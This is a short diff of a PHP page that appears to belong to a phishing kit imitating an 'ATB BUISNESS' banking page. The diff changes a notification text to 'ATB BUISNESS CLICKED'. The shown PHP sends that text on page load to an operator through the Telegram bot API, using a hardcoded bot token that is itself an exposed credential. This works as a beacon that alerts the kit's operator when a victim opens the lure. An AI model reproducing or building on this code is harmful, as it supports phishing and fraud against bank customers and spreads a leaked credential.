@@ -1,7 +1,7 @@
 <?php
 
 
-$message ="ATB BUISNESS\n";
+$message = "ATB BUISNESS CLICKED\n";
 
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
@@ -14,8 +14,6 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
                                                     
 
 ?>
-   
-
 
  <html class="fa-events-icons-ready">
 
